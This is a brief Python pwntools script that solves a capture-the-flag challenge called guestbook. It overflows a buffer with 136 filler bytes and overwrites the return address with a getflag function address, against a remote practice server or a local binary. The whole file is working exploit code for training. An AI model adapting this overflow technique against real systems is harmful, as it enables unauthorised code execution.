#coding = utf-8
from pwn import *

debug = False

HOST = 'pwn.jarvisoj.com'
PORT = 9876

getflag = 0x400620


if debug:
	p = process('./guestbook.d3d5869bd6fb04dd35b29c67426c0f05')

else :
	p = remote(HOST,PORT)

payload = 'a'*136+p64(getflag)
p.recvuntil('message:')
p.sendline(payload)
p.interactive()